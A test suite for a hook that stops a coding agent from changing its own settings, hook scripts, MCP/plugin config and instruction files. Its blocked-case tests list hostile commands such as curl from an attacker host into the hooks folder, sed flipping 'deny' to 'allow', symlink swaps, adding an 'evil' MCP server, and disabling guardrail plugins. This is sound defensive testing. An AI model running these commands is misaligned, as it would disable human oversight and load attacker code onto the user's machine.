#!/usr/bin/env node
/**
 * Tests for config-guard.js
 *
 * Run: node --test hook-scripts/tests/pre-tool-use/config-guard.test.js
 * Or:  npm test
 */

const { describe, it } = require('node:test');
const assert = require('node:assert');
const { spawn } = require('node:child_process');
const path = require('node:path');
const fs = require('node:fs');
const os = require('node:os');

const {
  PROTECTED_PATHS,
  BASH_TOKENS,
  LEVELS,
  SAFETY_LEVEL,
  checkTool,
  checkFilePath,
  checkBashCommand,
} = require('../../pre-tool-use/config-guard.js');

const SCRIPT_PATH = path.join(__dirname, '../../pre-tool-use/config-guard.js');

// ─────────────────────────────────────────────────────────────────────────────
// Test helpers
// ─────────────────────────────────────────────────────────────────────────────

function fileBlocked(filePath, expectedId = null, level = undefined) {
  const result = checkFilePath(filePath, level);
  assert.strictEqual(result.blocked, true, `Expected BLOCKED but ALLOWED: ${filePath}`);
  if (expectedId) {
    assert.strictEqual(result.id, expectedId, `Expected '${expectedId}' but got '${result.id}'`);
  }
}

function fileAllowed(filePath, level = undefined) {
  const result = checkFilePath(filePath, level);
  assert.strictEqual(result.blocked, false, `Expected ALLOWED but BLOCKED by '${result.id}': ${filePath}`);
}

function bashBlocked(cmd, expectedId = null, level = undefined) {
  const result = checkBashCommand(cmd, level);
  assert.strictEqual(result.blocked, true, `Expected BLOCKED but ALLOWED: ${cmd}`);
  if (expectedId) {
    assert.strictEqual(result.id, expectedId, `Expected '${expectedId}' but got '${result.id}'`);
  }
}

function bashAllowed(cmd, level = undefined) {
  const result = checkBashCommand(cmd, level);
  assert.strictEqual(result.blocked, false, `Expected ALLOWED but BLOCKED by '${result.id}': ${cmd}`);
}

// Spawns the actual script with a temp HOME (no noise in the real
// ~/.claude/hooks-logs) and without inheriting HOOK_ASK_* / CONFIG_GUARD_*
// from the runner's shell - tests opt in explicitly via envOverrides.
const TMP_HOME = fs.mkdtempSync(path.join(os.tmpdir(), 'config-guard-test-'));

function runHook(payload, envOverrides = {}) {
  return new Promise((resolve, reject) => {
    const env = { ...process.env, HOME: TMP_HOME, ...envOverrides };
    for (const key of Object.keys(env)) {
      if ((key.startsWith('HOOK_ASK_') || key.startsWith('CONFIG_GUARD_')) && !(key in envOverrides)) {
        delete env[key];
      }
    }
    const child = spawn('node', [SCRIPT_PATH], { env });
    let stdout = '';
    let stderr = '';

    child.stdout.on('data', (data) => { stdout += data; });
    child.stderr.on('data', (data) => { stderr += data; });

    child.on('close', (code) => {
      try {
        const output = JSON.parse(stdout.trim());
        resolve({ code, output, stderr });
      } catch (e) {
        reject(new Error(`Failed to parse output: ${stdout}`));
      }
    });

    child.stdin.write(typeof payload === 'string' ? payload : JSON.stringify(payload));
    child.stdin.end();
  });
}

function toolPayload(toolName, toolInput) {
  return {
    tool_name: toolName,
    tool_input: toolInput,
    session_id: 'test-session',
    cwd: '/tmp',
    permission_mode: 'default',
  };
}

// ─────────────────────────────────────────────────────────────────────────────
// Unit Tests - checkFilePath() (Edit / MultiEdit / Write targets)
// ─────────────────────────────────────────────────────────────────────────────

describe('Unit: checkFilePath()', () => {
  describe('CRITICAL: settings files', () => {
    it('blocks .claude/settings.json', () => fileBlocked('.claude/settings.json', 'settings-file'));
    it('blocks project-absolute .claude/settings.json', () => fileBlocked('/Users/dev/proj/.claude/settings.json', 'settings-file'));
    it('blocks .claude/settings.local.json', () => fileBlocked('.claude/settings.local.json', 'settings-file'));
    it('blocks ~/.claude/settings.json', () => fileBlocked('~/.claude/settings.json', 'settings-file'));
    it('blocks /home/user/.claude/settings.json', () => fileBlocked('/home/user/.claude/settings.json', 'settings-file'));
    it('blocks managed-settings.json', () => fileBlocked('/Library/Application Support/ClaudeCode/managed-settings.json', 'managed-settings'));
    it('blocks case variants on case-insensitive filesystems', () => fileBlocked('.Claude/Settings.JSON', 'settings-file'));
  });

  describe('CRITICAL: hook scripts and manifests', () => {
    it('blocks a script under .claude/hooks/ (self-protection)', () => fileBlocked('/Users/dev/.claude/hooks/config-guard.js', 'hook-script'));
    it('blocks creating a new script under .claude/hooks/', () => fileBlocked('.claude/hooks/evil.js', 'hook-script'));
    it('blocks a plugin hooks.json', () => fileBlocked('plugins/foo/hooks/hooks.json', 'hooks-manifest'));
    it('blocks a bare hooks.json', () => fileBlocked('hooks.json', 'hooks-manifest'));
  });

  describe('HIGH: MCP and plugin config', () => {
    it('blocks .mcp.json', () => fileBlocked('.mcp.json', 'mcp-config'));
    it('blocks project-absolute .mcp.json', () => fileBlocked('/Users/dev/proj/.mcp.json', 'mcp-config'));
    it('blocks .claude-plugin/marketplace.json', () => fileBlocked('.claude-plugin/marketplace.json', 'plugin-manifest'));
    it('blocks nested .claude-plugin/plugin.json', () => fileBlocked('plugins/x/.claude-plugin/plugin.json', 'plugin-manifest'));
    it('critical level does NOT block .mcp.json', () => fileAllowed('.mcp.json', 'critical'));
  });

  describe('STRICT: instruction files (opt-in tier)', () => {
    it('blocks CLAUDE.md at strict', () => fileBlocked('CLAUDE.md', 'claude-md', 'strict'));
    it('blocks CLAUDE.local.md at strict', () => fileBlocked('/repo/CLAUDE.local.md', 'claude-md', 'strict'));
    it('blocks .claude/rules/style.md at strict', () => fileBlocked('.claude/rules/style.md', 'rules-dir', 'strict'));
    it('blocks .claude/agents/reviewer.md at strict', () => fileBlocked('.claude/agents/reviewer.md', 'rules-dir', 'strict'));
    it('blocks .claude/commands/deploy.md at strict', () => fileBlocked('.claude/commands/deploy.md', 'rules-dir', 'strict'));
    it('default (high) does NOT block CLAUDE.md', () => fileAllowed('CLAUDE.md'));
    it('default (high) does NOT block .claude/rules/style.md', () => fileAllowed('.claude/rules/style.md'));
  });

  describe('Symlinked parents are resolved', () => {
    // A path that looks innocent but really lands in .claude must still block:
    // `ln -s ~/.claude /tmp/x` then Write /tmp/x/settings.json.
    const symHome = fs.mkdtempSync(path.join(os.tmpdir(), 'config-guard-symlink-'));
    const claudeDir = path.join(symHome, '.claude');
    fs.mkdirSync(path.join(claudeDir, 'hooks'), { recursive: true });
    fs.writeFileSync(path.join(claudeDir, 'settings.json'), '{}');
    const dirLink = path.join(symHome, 'innocent');
    fs.symlinkSync(claudeDir, dirLink);

    it('blocks a write through a symlinked .claude dir (existing file)', () =>
      fileBlocked(path.join(dirLink, 'settings.json'), 'settings-file'));
    it('blocks creating a NEW file through a symlinked hooks dir (parent resolution)', () => {
      const hooksLink = path.join(symHome, 'h');
      fs.symlinkSync(path.join(claudeDir, 'hooks'), hooksLink);
      fileBlocked(path.join(hooksLink, 'evil.js'), 'hook-script');
    });
    it('still allows a benign file behind a symlink to an ordinary dir', () => {
      const okDir = path.join(symHome, 'okdir');
      fs.mkdirSync(okDir);
      const okLink = path.join(symHome, 'oklink');
      fs.symlinkSync(okDir, okLink);
      fileAllowed(path.join(okLink, 'notes.txt'));
    });
  });

  describe('Unrelated files pass', () => {
    it('allows src/app.js', () => fileAllowed('src/app.js'));
    it('allows .gitignore', () => fileAllowed('.gitignore'));
    it('allows .eslintrc.json', () => fileAllowed('.eslintrc.json'));
    it('allows package.json', () => fileAllowed('package.json'));
    it('allows an app-level config/settings.json (not .claude)', () => fileAllowed('config/settings.json'));
    it('allows webhooks.json (not hooks.json)', () => fileAllowed('src/webhooks.json'));
    it('allows app hooks.js (not hooks.json)', () => fileAllowed('app/hooks.js'));
    it('allows a React hooks directory', () => fileAllowed('src/hooks/useAuth.ts'));
    it('allows README inside .claude project docs', () => fileAllowed('.claude/README.md'));
    it('allows empty path', () => fileAllowed(''));
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Unit Tests - checkTool() routing (reads must never block)
// ─────────────────────────────────────────────────────────────────────────────

describe('Unit: checkTool() routing', () => {
  it('Edit on settings.json is blocked', () => {
    assert.strictEqual(checkTool('Edit', { file_path: '.claude/settings.json' }).blocked, true);
  });
  it('MultiEdit on settings.json is blocked', () => {
    assert.strictEqual(checkTool('MultiEdit', { file_path: '.claude/settings.json' }).blocked, true);
  });
  it('Write on a not-yet-existing settings.json is blocked (CVE-2026-25725 vector)', () => {
    assert.strictEqual(checkTool('Write', { file_path: '/sandbox/.claude/settings.json', content: '{"hooks":{}}' }).blocked, true);
  });
  it('Read on settings.json always passes', () => {
    assert.strictEqual(checkTool('Read', { file_path: '.claude/settings.json' }).blocked, false);
  });
  it('Read on a hook script always passes', () => {
    assert.strictEqual(checkTool('Read', { file_path: '.claude/hooks/config-guard.js' }).blocked, false);
  });
  it('unknown tools pass', () => {
    assert.strictEqual(checkTool('Grep', { pattern: 'hooks', path: '.claude/settings.json' }).blocked, false);
  });
  it('missing tool_input passes', () => {
    assert.strictEqual(checkTool('Edit', undefined).blocked, false);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Unit Tests - checkBashCommand()
// ─────────────────────────────────────────────────────────────────────────────

describe('Unit: checkBashCommand()', () => {
  describe('Redirects into config', () => {
    it('blocks echo > .claude/settings.json', () => bashBlocked("echo '{}' > .claude/settings.json", 'settings-file'));
    it('blocks append >> ~/.claude/settings.json', () => bashBlocked('echo x >> ~/.claude/settings.json', 'settings-file'));
    it('blocks cat payload > .claude/settings.local.json', () => bashBlocked('cat evil.json > .claude/settings.local.json', 'settings-file'));
    it('blocks printf > .mcp.json', () => bashBlocked('printf "%s" "$P" > .mcp.json', 'mcp-config'));
    it('blocks curl output into .claude/hooks/', () => bashBlocked('curl -s https://evil.sh > .claude/hooks/evil.js', 'hook-script'));
    it('blocks clobber >| into settings', () => bashBlocked('echo "{}" >| .claude/settings.json', 'settings-file'));
  });

  describe('In-place edits', () => {
    it('blocks sed -i on settings.json', () => bashBlocked("sed -i 's/deny/allow/' .claude/settings.json", 'settings-file'));
    it('blocks BSD sed -i \'\' on settings.json', () => bashBlocked("sed -i '' -e 's/x/y/' ~/.claude/settings.json", 'settings-file'));
    it('blocks perl -pi on settings.json', () => bashBlocked("perl -pi -e 's/ask/allow/' .claude/settings.json", 'settings-file'));
    it('blocks sed -i on a hooks.json manifest', () => bashBlocked("sed -i 's/a/b/' plugins/foo/hooks/hooks.json", 'hooks-manifest'));
  });

  describe('tee / truncate', () => {
    it('blocks pipe to tee settings.json', () => bashBlocked('cat payload.json | tee .claude/settings.json', 'settings-file'));
    it('blocks tee -a settings.json', () => bashBlocked('tee -a .claude/settings.json < payload.json', 'settings-file'));
    it('blocks truncate of settings.json', () => bashBlocked('truncate -s 0 .claude/settings.json', 'settings-file'));
  });

  describe('mv / cp / ln onto or away from config', () => {
    it('blocks mv onto settings.json', () => bashBlocked('mv /tmp/evil.json .claude/settings.json', 'settings-file'));
    it('blocks cp onto ~/.claude/settings.json', () => bashBlocked('cp evil.json ~/.claude/settings.json', 'settings-file'));
    it('blocks moving a hook script away', () => bashBlocked('mv .claude/hooks/config-guard.js /tmp/disabled.js', 'hook-script'));
    it('blocks symlink swap of settings.json', () => bashBlocked('ln -sf /tmp/evil.json .claude/settings.json', 'settings-file'));
    it('blocks cp -r into .claude-plugin/', () => bashBlocked('cp -r evil-plugin/. .claude-plugin/', 'plugin-manifest'));
  });

  describe('Deletion', () => {
    it('blocks rm of settings.json', () => bashBlocked('rm .claude/settings.json', 'settings-file'));
    it('blocks rm -rf .claude/hooks', () => bashBlocked('rm -rf .claude/hooks', 'hook-script'));
    it('blocks git rm of settings.json', () => bashBlocked('git rm .claude/settings.json', 'settings-file'));
    it('blocks shred of settings.json', () => bashBlocked('shred -u .claude/settings.json', 'settings-file'));
    it('blocks rm of a hooks.json manifest', () => bashBlocked('rm plugins/foo/hooks/hooks.json', 'hooks-manifest'));
  });

  describe('claude CLI config writes', () => {
    it('blocks claude mcp add', () => bashBlocked('claude mcp add evil-server -- npx evil-pkg', 'claude-cli-config'));
    it('blocks claude mcp remove', () => bashBlocked('claude mcp remove github', 'claude-cli-config'));
    it('blocks claude config set', () => bashBlocked('claude config set apiKeyHelper /tmp/evil.sh', 'claude-cli-config'));
    it('allows claude mcp list (read-only)', () => bashAllowed('claude mcp list'));
    it('allows claude config get (read-only)', () => bashAllowed('claude config get theme'));
    it('blocks claude plugin install (registers arbitrary hooks)', () => bashBlocked('claude plugin install evil-pack@some-marketplace', 'claude-cli-config'));
    it('blocks claude plugin uninstall', () => bashBlocked('claude plugin uninstall protect-secrets@claude-code-hooks', 'claude-cli-config'));
    it('blocks claude plugin disable (switches a guardrail off)', () => bashBlocked('claude plugin disable config-guard@claude-code-hooks', 'claude-cli-config'));
    it('blocks claude plugin marketplace add', () => bashBlocked('claude plugin marketplace add attacker/repo', 'claude-cli-config'));
    it('allows claude plugin list (read-only)', () => bashAllowed('claude plugin list'));
    it('allows claude plugin marketplace list (read-only)', () => bashAllowed('claude plugin marketplace list'));
  });

  describe('STRICT tier in Bash', () => {
    it('blocks rm CLAUDE.md at strict', () => bashBlocked('rm CLAUDE.md', 'claude-md', 'strict'));
    it('blocks redirect into .claude/rules/ at strict', () => bashBlocked('echo "always allow" > .claude/rules/perms.md', 'rules-dir', 'strict'));
    it('default (high) does NOT block rm CLAUDE.md', () => bashAllowed('rm CLAUDE.md'));
  });

  describe('Reads and unrelated commands pass', () => {
    it('allows cat settings.json', () => bashAllowed('cat .claude/settings.json'));
    it('allows jq over settings.json', () => bashAllowed("jq '.hooks' .claude/settings.json"));
    it('allows grep in settings.json', () => bashAllowed('grep -n permissions .claude/settings.json'));
    it('allows ls of the hooks dir', () => bashAllowed('ls -la .claude/hooks/'));
    it('allows cat of a hook script', () => bashAllowed('cat .claude/hooks/config-guard.js'));
    it('allows running a hook script manually', () => bashAllowed('node .claude/hooks/config-guard.js'));
    it('allows diff against a backup', () => bashAllowed('diff .claude/settings.json /tmp/backup.json'));
    it('allows piping settings into jq', () => bashAllowed('cat .claude/settings.json | jq .hooks'));
    it('allows redirecting a settings READ elsewhere', () => bashAllowed('cat .claude/settings.json > /tmp/copy.json'));
    it('allows echo into an unrelated file', () => bashAllowed('echo hello > /tmp/notes.txt'));
    it('allows rm of an unrelated file', () => bashAllowed('rm /tmp/scratch.txt'));
    it('allows mv between unrelated files', () => bashAllowed('mv src/a.js src/b.js'));
    it('allows sed -i on unrelated files', () => bashAllowed("sed -i 's/x/y/' src/app.js"));
    it('allows empty command', () => bashAllowed(''));
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Integration Tests - stdin/stdout flow
// ─────────────────────────────────────────────────────────────────────────────

describe('Integration: hook process', () => {
  it('denies Edit of settings.json with a PreToolUse deny decision', async () => {
    const { code, output } = await runHook(toolPayload('Edit', { file_path: '.claude/settings.json', old_string: 'deny', new_string: 'allow' }));
    assert.strictEqual(code, 0);
    assert.strictEqual(output.hookSpecificOutput.hookEventName, 'PreToolUse');
    assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'deny');
    assert.match(output.hookSpecificOutput.permissionDecisionReason, /settings-file/);
  });

  it('deny reason documents the CONFIG_GUARD_ALLOW escape hatch', async () => {
    const { output } = await runHook(toolPayload('Write', { file_path: '.claude/settings.json', content: '{}' }));
    assert.match(output.hookSpecificOutput.permissionDecisionReason, /CONFIG_GUARD_ALLOW=true/);
  });

  it('denies a Bash redirect into settings.json', async () => {
    const { output } = await runHook(toolPayload('Bash', { command: "echo '{}' > .claude/settings.json" }));
    assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'deny');
  });

  it('passes a Read of settings.json', async () => {
    const { code, output } = await runHook(toolPayload('Read', { file_path: '.claude/settings.json' }));
    assert.strictEqual(code, 0);
    assert.deepStrictEqual(output, {});
  });

  it('passes a Write to an unrelated file', async () => {
    const { output } = await runHook(toolPayload('Write', { file_path: 'src/app.js', content: 'x' }));
    assert.deepStrictEqual(output, {});
  });

  describe('Ask mode', () => {
    it('returns "ask" for settings.json when HOOK_ASK_CRITICAL=true', async () => {
      const { output } = await runHook(toolPayload('Edit', { file_path: '.claude/settings.json', old_string: 'a', new_string: 'b' }), { HOOK_ASK_CRITICAL: 'true' });
      assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'ask');
    });
    it('returns "ask" for .mcp.json when HOOK_ASK_HIGH=true', async () => {
      const { output } = await runHook(toolPayload('Write', { file_path: '.mcp.json', content: '{}' }), { HOOK_ASK_HIGH: 'true' });
      assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'ask');
    });
    it('ask mode is per level: HOOK_ASK_HIGH does not soften critical settings.json', async () => {
      const { output } = await runHook(toolPayload('Edit', { file_path: '.claude/settings.json', old_string: 'a', new_string: 'b' }), { HOOK_ASK_HIGH: 'true' });
      assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'deny');
    });
    it('defaults to "deny" when no HOOK_ASK_* is set', async () => {
      const { output } = await runHook(toolPayload('Edit', { file_path: '.claude/settings.json', old_string: 'a', new_string: 'b' }));
      assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'deny');
    });
  });

  describe('CONFIG_GUARD_ALLOW escape hatch', () => {
    it('allows an intentional settings.json edit with CONFIG_GUARD_ALLOW=true', async () => {
      const { code, output } = await runHook(toolPayload('Edit', { file_path: '.claude/settings.json', old_string: 'a', new_string: 'b' }), { CONFIG_GUARD_ALLOW: 'true' });
      assert.strictEqual(code, 0);
      assert.deepStrictEqual(output, {});
    });
    it('still denies with CONFIG_GUARD_ALLOW=false', async () => {
      const { output } = await runHook(toolPayload('Edit', { file_path: '.claude/settings.json', old_string: 'a', new_string: 'b' }), { CONFIG_GUARD_ALLOW: 'false' });
      assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'deny');
    });
    it('requires the literal string "true": CONFIG_GUARD_ALLOW=1 still denies', async () => {
      const { output } = await runHook(toolPayload('Edit', { file_path: '.claude/settings.json', old_string: 'a', new_string: 'b' }), { CONFIG_GUARD_ALLOW: '1' });
      assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'deny');
    });
  });

  describe('Malformed payloads', () => {
    it('outputs {} and exits 0 on invalid JSON', async () => {
      const { code, output } = await runHook('this is not json');
      assert.strictEqual(code, 0);
      assert.deepStrictEqual(output, {});
    });
    it('outputs {} and exits 0 on a null payload', async () => {
      const { code, output } = await runHook('null');
      assert.strictEqual(code, 0);
      assert.deepStrictEqual(output, {});
    });
    it('outputs {} and exits 0 on an empty object', async () => {
      const { code, output } = await runHook({});
      assert.strictEqual(code, 0);
      assert.deepStrictEqual(output, {});
    });
    it('outputs {} when tool_input is missing', async () => {
      const { output } = await runHook({ tool_name: 'Edit' });
      assert.deepStrictEqual(output, {});
    });
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Config validation
// ─────────────────────────────────────────────────────────────────────────────

describe('Config validation', () => {
  it('SAFETY_LEVEL is a valid level', () => {
    assert.ok(['critical', 'high', 'strict'].includes(SAFETY_LEVEL));
  });
  it('every protected path pattern has level, id, regex, reason', () => {
    for (const p of PROTECTED_PATHS) {
      assert.ok(p.level in LEVELS, `bad level on ${p.id}`);
      assert.ok(typeof p.id === 'string' && p.id.length > 0);
      assert.ok(p.regex instanceof RegExp);
      assert.ok(typeof p.reason === 'string' && p.reason.length > 0);
    }
  });
  it('every bash token has level, id, regex, reason', () => {
    for (const t of BASH_TOKENS) {
      assert.ok(t.level in LEVELS, `bad level on ${t.id}`);
      assert.ok(typeof t.id === 'string' && t.id.length > 0);
      assert.ok(t.regex instanceof RegExp);
      assert.ok(typeof t.reason === 'string' && t.reason.length > 0);
    }
  });
  it('path patterns and bash tokens cover the same target ids', () => {
    const pathIds = new Set(PROTECTED_PATHS.map((p) => p.id));
    const tokenIds = new Set(BASH_TOKENS.map((t) => t.id));
    assert.deepStrictEqual([...tokenIds].sort(), [...pathIds].sort());
  });
});
